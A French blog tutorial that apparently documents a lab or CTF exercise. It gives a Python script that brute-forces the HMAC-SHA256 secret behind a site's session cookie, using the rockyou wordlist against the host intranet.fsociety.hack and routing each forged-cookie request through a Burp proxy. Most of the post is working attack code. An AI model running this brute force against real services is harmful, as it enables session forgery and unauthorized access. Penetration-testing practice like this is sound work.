---
title: Burp proxy brute force using python
meta_title: ""
description: Petit article pour savoir intercepter toutes les requêtes dans burp provenant d'un brute-force d'une authentification Web. 
date: 2024-04-04T05:00:00Z
image: /images/burp_and_python.png
categories:
  - Méthodes
author: Tmax
tags:
  - Méthodes
  - Fiches
  - Burp
  - Python
  - Brute-force
draft: false
---

Le script d'exemple présenté ici a été utilisé pour intercepter chaque tentative d'un brute-force dans Burp. 
L'objectif était de générer une signature hmac_sha256 valide où la HMAC_SHA256 = {Secret + Cookie}. 

Il faut avant tout créer une session et effectuer une première requête à notre serveur : 

```python
BASEURL = "http://intranet.fsociety.hack:2600"

sess = requests.Session()
req = sess.get(f"{BASEURL}")

```

Le cookie est récupérer grâce à :

```python
cookies = sess.cookies.get_dict() # Récupère un dictionnaire de tous les cookies de la session en cours
cookie_name = list(cookies.keys())[0] # Récupère la première clef du dictionnaire cookie
cookie_value = cookies[cookie_name] # Récupère la valeure assosiée à la premiere clef du dictionnaire cookie
```

Maintenant, à partir d'une wordlist, il faut envoyer plusieurs tentatives au serveur afin de trouver le secret qui permettra de valider notre signature. 

Pour cela, il s'agit avant tout de déclarer notre proxy et le chemin vers notre wordlist 

```python
proxy = {

    'http': 'http://127.0.0.1:8888'
}

WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'
```

Puis, créer une boucle qui itère sur chaque élément de notre wordlist afin de réaliser notre brute force 

```python
with open(WORDLIST_PATH, 'r') as wordlist_file:
    for word in wordlist_file:
        word = word.strip()  # Supprimer les espaces et les sauts de ligne
        hmac_signature = generate_hmac_sha256(word, cookie_value) # utilisation d'une fonction custom generate_hmac_sha256()
        modified_cookie_value = f"{cookie_value}.{hmac_signature}"
        modified_cookie = {'name': cookie_name, 'value': modified_cookie_value}
        headers = {'Cookie': f"{modified_cookie['name']}={modified_cookie['value']}"} # Ajouter le cookie aux headers HTTP 
        response = sess.get(BASEURL, proxies=proxy, headers=headers) # Utiliser le proxy
```

L'élément le plus important ici est la récupération du trafic au sein de notre proxy, le création du reste du code vous appartient en fonction du cas que vous rencontrerez : 

```python
response = sess.get(BASEURL, proxies=proxy, headers=headers)
```

Voici le code complet : 

```python
import requests
import re
import hmac
import hashlib
import base64

def generate_hmac_sha256(key, message):
    key_bytes = bytes(key, 'utf-8') if isinstance(key, str) else key
    message_bytes = bytes(message, 'utf-8') if isinstance(message, str) else message
    hmac_sha256 = hmac.new(key_bytes, message_bytes, hashlib.sha256).digest()
    hmac_sha256_base64 = base64.b64encode(hmac_sha256).decode('utf-8')
    return hmac_sha256_base64

def send_request_with_hmac(url, proxies, hmac_signature, cookies):
    headers = {'Cookie': f"{cookies['name']}={cookies['value']}"}
    params = {'hmac_signature': hmac_signature}
    response = requests.get(url, proxies=proxies, headers=headers, params=params)

BASEURL = "http://intranet.fsociety.hack:2600"

proxy = {

    'http': 'http://127.0.0.1:8888'
}

WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'


sess = requests.Session()
req = sess.get(f"{BASEURL}")
cookies = sess.cookies.get_dict()

cookie_name = list(cookies.keys())[0]
cookie_value = cookies[cookie_name]
cookie = {'name': cookie_name, 'value': cookie_value}

with open(WORDLIST_PATH, 'r') as wordlist_file:
    for word in wordlist_file:
        word = word.strip()  # Supprimer les espaces et les sauts de ligne
        hmac_signature = generate_hmac_sha256(word, cookie_value)
        modified_cookie_value = f"{cookie_value}.{hmac_signature}"
        modified_cookie = {'name': cookie_name, 'value': modified_cookie_value}
        headers = {'Cookie': f"{modified_cookie['name']}={modified_cookie['value']}"}
        response = sess.get(BASEURL, proxies=proxy, headers=headers)
```